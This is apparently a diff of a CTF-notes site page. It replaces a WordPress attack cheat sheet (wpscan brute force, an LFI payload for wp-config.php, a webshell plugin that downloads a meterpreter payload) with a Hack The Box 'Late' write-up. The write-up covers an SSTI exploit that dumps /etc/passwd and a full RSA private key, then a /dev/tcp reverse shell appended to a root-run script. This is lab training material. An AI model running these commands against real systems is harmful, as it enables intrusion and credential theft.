@@ -9,33 +9,35 @@
     <meta name="generator" content="Retype 2.4.0">
 
     <!-- Primary Meta Tags -->
-    <title>Wordpress</title>
-    <meta name="title" content="Wordpress">
-    <meta name="description" content="It will try to enumerate many things and it might take long." />
+    <title>Late</title>
+    <meta name="title" content="Late">
+    <meta name="description" content="IP: 10.129.166.198" />
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://caueb.github.io/enumeration/port-80-44-c44be/wordpress/" />
+    <link rel="canonical" href="https://caueb.github.io/writeups/htb/boxes/late/" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://caueb.github.io/enumeration/port-80-44-c44be/wordpress/">
-    <meta property="og:title" content="Wordpress">
-    <meta property="og:description" content="It will try to enumerate many things and it might take long.">
+    <meta property="og:url" content="https://caueb.github.io/writeups/htb/boxes/late/">
+    <meta property="og:title" content="Late">
+    <meta property="og:description" content="IP: 10.129.166.198">
+    <meta property="og:image" content="https://caueb.github.io/writeups/htb/boxes/late/images/image1.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://caueb.github.io/enumeration/port-80-44-c44be/wordpress/">
-    <meta property="twitter:title" content="Wordpress">
-    <meta property="twitter:description" content="It will try to enumerate many things and it might take long.">
+    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/boxes/late/">
+    <meta property="twitter:title" content="Late">
+    <meta property="twitter:description" content="IP: 10.129.166.198">
+    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/late/images/image1.png">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../resources/css/retype.css?v=2.4.0.712628353196" rel="stylesheet" />
+    <link href="../../../../resources/css/retype.css?v=2.4.0.712628353196" rel="stylesheet" />
 
-    <script type="text/javascript" src="../../../resources/js/config.js?v=2.4.0.712628353196" data-turbo-eval="false" defer></script>
-    <script type="text/javascript" src="../../../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" type="text/javascript" src="../../../resources/js/lunr.js?v=2.4.0.712628353196" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../../../resources/js/prism.js?v=2.4.0.712628353196" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.712628353196" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.712628353196" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.712628353196" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -50,7 +52,7 @@
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-2xl">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                             <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
                         </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
                     </div>
@@ -201,153 +203,298 @@
                                 <div id="docs-sidebar-right-toggle"></div>
                 
                                 <!-- Page content  -->
-<doc-anchor-target id="wordpress" class="break-words">
+<doc-anchor-target id="late" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#wordpress">#</doc-anchor-trigger>
-        <span>Wordpress</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#late">#</doc-anchor-trigger>
+        <span>Late</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="basic-enumeration">
+<p>IP: 10.129.166.198</p>
+<doc-anchor-target id="nmap---port-scan">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#basic-enumeration">#</doc-anchor-trigger>
-        <span>Basic Enumeration</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap---port-scan">#</doc-anchor-trigger>
+        <span>Nmap - Port Scan</span>
     </h2>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">wpscan --url http://10.10.128.151</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="super-scan">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#super-scan">#</doc-anchor-trigger>
-        <span>Super Scan</span>
-    </h2>
-</doc-anchor-target>
-<p>It will try to enumerate many things and it might take long.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">wpscan --url http://10.10.128.151/ --enumerate ap,at,cb,dbe,u</code></pre>
-</doc-codeblock></div>
-<div class="table-wrapper scrollbar overflow-hidden">
-<table class="comfortable">
-<thead>
-<tr>
-<th><strong>Argument</strong></th>
-<th><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>-ap</td>
-<td>All Plugins</td>
-</tr>
-<tr>
-<td>-p</td>
-<td>Plugins</td>
-</tr>
-<tr>
-<td>-vp</td>
-<td>Vulnerable Plugins</td>
-</tr>
-<tr>
-<td>-u</td>
-<td>Users</td>
-</tr>
-<tr>
-<td>-vt</td>
-<td>Vulnerable Themes</td>
-</tr>
-<tr>
-<td>-at</td>
-<td>All themes</td>
-</tr>
-<tr>
-<td>-cb</td>
-<td>Config Backup</td>
-</tr>
-<tr>
-<td>--plugins-detection mixed</td>
-<td>Plugin detection mode.</td>
-</tr>
-<tr>
-<td>--plugins-detection passive</td>
-<td>Plugin detection mode.</td>
-</tr>
-<tr>
-<td>--plugins-detection aggresive</td>
-<td>Plugin detection mode. Bruteforce</td>
-</tr>
-</tbody>
-</table>
-</div>
-<doc-anchor-target id="enumerate-users">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#enumerate-users">#</doc-anchor-trigger>
-        <span>Enumerate users</span>
-    </h2>
+<doc-anchor-target id="all-ports">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#all-ports">#</doc-anchor-trigger>
+        <span>All ports</span>
+    </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">wpscan --url http://10.10.128.151/ -e u</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.129.166.198
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="bruteforce-login-with-a-user-and-a-password-list">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#bruteforce-login-with-a-user-and-a-password-list">#</doc-anchor-trigger>
-        <span>Bruteforce login with a user and a password list</span>
-    </h2>
+<doc-anchor-target id="service--safe-scripts">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#service--safe-scripts">#</doc-anchor-trigger>
+        <span>Service &amp; Safe Scripts</span>
+    </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">wpscan --url http://10.10.128.151 --passwords fsocity.dic -U elliot</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 22,80 10.129.166.198 -o nmap.txt
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-25 19:09 AWST
+Nmap scan report for 10.129.166.198
+Host is up (0.29s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
+|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
+|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Late - Best online image tools
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="found-lfi-">
+<doc-anchor-target id="port-80---http">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#found-lfi-">#</doc-anchor-trigger>
-        <span>Found LFI ?</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#port-80---http">#</doc-anchor-trigger>
+        <span>Port 80 - HTTP</span>
     </h2>
 </doc-anchor-target>
-<p>Try to read Wordpress config file:</p>
+<p>Browsing to <a href="http://10.129.166.198">http://10.129.166.198</a> a web page of what it seems to be a photo editing service is loaded. Looking at the source-code we can see some references to 2 hosts:</p>
+<ul>
+<li>late.htb</li>
+<li>images.late.htb
+<figure class="content-center">
+    <img src="images/image1.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</li>
+</ul>
+<p>Lets add it to our <code v-pre>/etc/hosts</code> file:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php</code></pre>
+<pre class="language-none"><code v-pre class="language-none">10.129.166.198  late.htb images.late.htb</code></pre>
 </doc-codeblock></div>
-<p>More paths to test <a href="https://github.com/D35m0nd142/LFISuite/blob/master/pathtotest.txt">here</a>.</p>
-<doc-anchor-target id="install-malicious-plugin---webshell">
+<p>Now we can access <a href="http://images.late.htb/">http://images.late.htb/</a>:
+<figure class="content-center">
+    <img src="images/image2.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>If we pay attention, the title says &quot;Flask&quot;, and this framework is known for Server-Side-Template-Injection issues. So if this application turn images into text we could pottenctially send an image containing a SSTI payload to test.</p>
+<doc-anchor-target id="testing-for-flask-ssti">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#testing-for-flask-ssti">#</doc-anchor-trigger>
+        <span>Testing for Flask SSTI</span>
+    </h3>
+</doc-anchor-target>
+<p>Lets start with the most simple payload: <code v-pre>49</code>. We can simply open any text editor, type in the payload, zoom in, and take a screenshot like below:
+<figure class="content-center">
+    <img src="images/7x7.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+Now we upload image to the website.</p>
+<p><figure class="content-center">
+    <img src="images/image3.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The application send us a text file of the results. Opening the <code v-pre>results.txt</code> file we see:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">&lt;p&gt;49
+&lt;/p&gt;</code></pre>
+</doc-codeblock></div>
+<p>This means that the application/server executed a simple 7x7 mathematic equation, in another words, we have remote command execution.</p>
+<doc-anchor-target id="foothold">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#install-malicious-plugin---webshell">#</doc-anchor-trigger>
-        <span>Install Malicious Plugin - WebShell</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
+        <span>Foothold</span>
     </h2>
 </doc-anchor-target>
+<p>Moving to another level now, lets see if we can get the <code v-pre>/etc/passwd</code> file. Googling around we can find multiple web sites with Flask SSTI payloads, after trying a couple ones  I found <a href="https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e">this</a> one to be working:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Wordpress Web Shell - Install as Plugin
-/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
-
-## Pack the plugin
-$ sudo zip plugin-shell plugin-shell.php
-
-## Upload the shell
-Add Plugins
-Upload Plugin
-Browse
-Select the zip file
-Install Now
-
-## Run Commands
-$ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=whoami
-
-## Get a reverse shell
-$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=443 -f elf &gt; shell.elf
-$ sudo python3 -m http.server 80
-$ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=wget%20http://192.168.100.10/shell.elf
-
-## Start a listener
-$ use exploit/multi/handler
-$ set PAYLOAD linux/x86/meterpreter/reverse_tcp (same as the MSFVENOM)
-$ set LPORT 443
-$ set LHOST tun0
-$ run
-
-## Make it executable (chmod +x shell.elf)
-$ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
-
-## Trigger the exploit
-$ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=./shell.elf</code></pre>
+<pre class="language-python"><code v-pre class="language-python">{{ ERROR }}</code></pre>
 </doc-codeblock></div>
+<p><em>While testing the SSTI payloads, I found out that some fonts works better than others, and we need to have a very clear screenshot of the payload. To circunvent this, I used <a href="https://www.figma.com">Figma</a> to create my screenshots.</em></p>
+<p><figure class="content-center">
+    <img src="images/passwd.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>And we got the <code v-pre>results.txt</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">&lt;p&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
+rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
+colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
+smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
+smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
+&lt;/p&gt;</code></pre>
+</doc-codeblock></div>
+<p>Searching for users in the <code v-pre>/etc/passwd</code> file we note the line:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash</code></pre>
+</doc-codeblock></div>
+<p>Which seems to be an interesting user with a <code v-pre>home</code> and a bash tty. During the nmap scan we saw that the SSH port is open. Using a guessing game, we can try to retrieve the SSH private key for this user. The payload looks like this:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">{{ ERROR }}</code></pre>
+</doc-codeblock></div>
+<p>I had to change the font to <code v-pre>Roboto</code> to make it work this time!
+And the image generated in Figma:
+<figure class="content-center">
+    <img src="images/ssh_idrsa.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>And the <code v-pre>results.txt</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">&lt;p&gt;-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
+HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
+bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
+/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
+d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
+7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
+fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
+ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
+W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
+uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
+T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
+Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
+WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
+Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
+t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
+0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
+uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
+3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
+GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
+ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
+Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
+kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
+Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
+K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
+kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
+-----END RSA PRIVATE KEY-----
+
+&lt;/p&gt;</code></pre>
+</doc-codeblock></div>
+<p>We can create a file with the contents, give it the right permissions(600) to the file and use it to SSH as <code v-pre>svs_acc</code> user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ ssh -i svc_acc.idrsa svc_acc@10.129.166.198</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="path-to-root">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#path-to-root">#</doc-anchor-trigger>
+        <span>Path to Root</span>
+    </h2>
+</doc-anchor-target>
+<p>Using <code v-pre>pspy</code> we notice that there is a cronjob creating a bash script and setting the owner as <code v-pre>svc_acc</code> user.
+It creates the following file:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">/usr/local/sbin/ssh-alert.sh</code></pre>
+</doc-codeblock></div>
+<p>With the contents:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">#!/bin/bash
+
+RECIPIENT=&quot;root@late.htb&quot;
+SUBJECT=&quot;Email from Server Login: SSH Alert&quot;
+
+BODY=&quot;
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+&quot;
+
+if [ ${PAM_TYPE} = &quot;open_session&quot; ]; then
+        echo &quot;Subject:${SUBJECT} ${BODY}&quot; | /usr/sbin/sendmail ${RECIPIENT}
+fi</code></pre>
+</doc-codeblock></div>
+<p>Using <code v-pre>lsattr</code> we see that we cannot edit the file contents but we can append!</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh
+-----a--------e--- ssh-alert.sh</code></pre>
+</doc-codeblock></div>
+<p>It seems that the script is executed as <code v-pre>root</code> when someone SSH in.</p>
+<doc-anchor-target id="privilege-escalation-to-root">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation-to-root">#</doc-anchor-trigger>
+        <span>Privilege Escalation to Root</span>
+    </h2>
+</doc-anchor-target>
+<p>We have &quot;append&quot; permissions over this file so we can simply add any system command in there and login with SSH to trigger the script.</p>
+<doc-anchor-target id="read-root-flag">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#read-root-flag">#</doc-anchor-trigger>
+        <span>Read root flag</span>
+    </h3>
+</doc-anchor-target>
+<p>Lets make a copy of the <code v-pre>root</code> flag to <code v-pre>/tmp</code> directory:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">echo 'cat /root/root.txt &gt; /tmp/root.txt' &gt;&gt; /usr/local/sbin/ssh-alert.sh</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="get-a-root-shell">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#get-a-root-shell">#</doc-anchor-trigger>
+        <span>Get a root shell</span>
+    </h3>
+</doc-anchor-target>
+<p>Or we could simply add a reverse shell:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">svc_acc@late:~$ echo 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.56/4444 0&gt;&amp;1&quot;' &gt;&gt; /usr/local/sbin/ssh-alert.sh
+svc_acc@late:~$ ssh localhost</code></pre>
+</doc-codeblock></div>
+<p>In Kali we receive the reverse shell:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/late$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.56] from (UNKNOWN) [10.129.166.198] 57468
+bash: cannot set terminal process group (9654): Inappropriate ioctl for device
+bash: no job control in this shell
+root@late:/# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+</doc-codeblock></div>
+<p>We are root.</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -357,20 +504,20 @@ $ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=./shell.elf</
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../enumeration/port-80-44-c44be/virtualhost/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/catch/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Virtual Host</span>
+                                                <span class="block mt-1">Catch</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../enumeration/nmap-ad6e3/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/overflow/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Nmap</span>
+                                                <span class="block mt-1">Overflow</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -414,6 +561,6 @@ $ curl http://10.10.10.110/wp-content/plugins/plugin-shell.php?cmd=./shell.elf</
 
     <div id="docs-overlay-target"></div>
 
-    <script>window.__DOCS__ = { "title": "Wordpress", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+    <script>window.__DOCS__ = { "title": "Late", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
 </body>
 </html>
